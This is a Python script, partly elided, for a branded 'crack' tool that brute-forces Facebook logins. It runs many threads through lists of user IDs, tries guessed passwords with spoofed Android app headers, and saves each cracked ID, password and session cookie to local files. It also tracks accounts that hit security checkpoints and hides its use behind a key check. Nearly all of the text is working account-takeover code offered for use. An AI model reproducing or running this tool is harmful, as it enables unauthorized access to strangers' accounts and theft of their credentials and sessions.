#-------------------------WRITTEN BY MR_NAJEEB--------------
#-------------------------- Code by MR-ERROR&MR_NAJEEB-----------
#-------------------Hello World -----------------------------
#SC MAKED BY MR_NAJEEB
import os
...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO MR_NAJEEB WORLD          ')
...
from concurrent.futures import ThreadPoolExecutor as SiamMR_NAJEEB
from string import * 
...
totaldmp = 0
filter = []
os.system("xdg-open-https://www.facebook.com/rashood.khan.16l")
sys.stdout.write('\x1b]2; Mr:NAJEEB\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
folder_path = '/sdcard/MR:MR_NAJEEB'
try:
...
__________________________________________________
 ...
 \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR_NAJEEB\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :              MR:NAJEEB
\033[1;92m Facebook:          :MR_NAJEEB
\033[1;92m Github  :               MR_NAJEEB
\033[1;92m Version :              0.0.5
──────────────────────────────────────────────────""")
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back MR_NAJEEB Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mMR_NAJEEB-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);MR_NAJEEBb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={MR_NAJEEBb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mMR_NAJEEB-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/MR_NAJEEB/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/MR_NAJEEB/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [MR_NAJEEB-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/MR_NAJEEB/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mMR_NAJEEB-XD-M3\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/MR_NAJEEB/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MR_NAJEEB/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [MR_NAJEEB-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/MR_NAJEEB/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mMR_NAJEEB-XD-M2\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//MR_NAJEEB/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/MR_NAJEEB/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [MR_NAJEEB-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/MR_NAJEEB/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mMR_NAJEEB-XD-M4\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/MR_NAJEEB/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/MR_NAJEEB/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//MR_NAJEEB/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def pasw(self):       
            ...
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamMR_NAJEEB(max_workers=30) as MR_NAJEEBworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                MR_NAJEEBworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                MR_NAJEEBworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                MR_NAJEEBworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                MR_NAJEEBworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def rcrack(uid,pwx,tl):
    ...
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"InfiMR_NAJEEB X678B"',
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR_NAJEEB-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('MR_NAJEEB-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[MR_NAJEEB-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('MR_NAJEEB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[MR_NAJEEB]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('MR_NAJEEB1x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+Xyteee)
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://www.facebook.com/rashood.khan.16").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
...
with SiamMR_NAJEEB(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(main_apv)
